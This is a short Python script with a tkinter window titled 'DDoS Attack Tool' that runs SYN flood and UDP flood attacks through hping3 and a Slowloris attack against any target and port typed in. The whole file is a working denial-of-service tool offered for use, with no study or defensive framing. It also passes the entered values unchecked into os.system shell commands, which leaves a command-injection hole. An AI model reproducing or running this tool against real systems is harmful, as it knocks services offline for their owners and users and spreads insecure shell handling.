#must run on ubuntu 

import os
import tkinter as tk
from tkinter import messagebox
import threading

# Function to launch SYN Flood Attack
def syn_flood(target, port):
    os.system(f"hping3 -S {target} -p {port} --flood")

# Function to launch UDP Flood Attack
def udp_flood(target, port):
    os.system(f"hping3 -2 {target} -p {port} --flood")

# Function to launch Slowloris Attack
def slowloris_attack(target, port):
    os.system(f"python3 slowloris/slowloris.py {target} -p {port}")

# Function to start the selected attack
def start_attack():
    target = target_entry.get()
    port = port_entry.get()

    if not target or not port:
        messagebox.showerror("Input Error", "Please enter both target and port.")
        return

    attack_type = attack_var.get()

    if attack_type == 1:
        threading.Thread(target=syn_flood, args=(target, port)).start()
    elif attack_type == 2:
        threading.Thread(target=udp_flood, args=(target, port)).start()
    elif attack_type == 3:
        threading.Thread(target=slowloris_attack, args=(target, port)).start()
    else:
        messagebox.showerror("Selection Error", "Please select an attack type.")

# GUI Setup
app = tk.Tk()
app.title("DDoS Attack Tool")
app.geometry("400x300")

# Target Input
tk.Label(app, text="Target URL/IP:").pack(pady=5)
target_entry = tk.Entry(app, width=50)
target_entry.pack(pady=5)

# Port Input
tk.Label(app, text="Target Port:").pack(pady=5)

port_entry = tk.Entry(app, width=50)
port_entry.pack(pady=5)

# Attack Type Selection
attack_var = tk.IntVar()
tk.Label(app, text="Select Attack Type:").pack(pady=10)
tk.Radiobutton(app, text="SYN Flood", variable=attack_var, value=1).pack()
tk.Radiobutton(app, text="UDP Flood", variable=attack_var, value=2).pack()
tk.Radiobutton(app, text="Slowloris Attack", variable=attack_var, value=3).pack()

# Start Button
tk.Button(app, text="Start Attack", command=start_attack, bg="red", fg="white").pack(pady=20)

app.mainloop()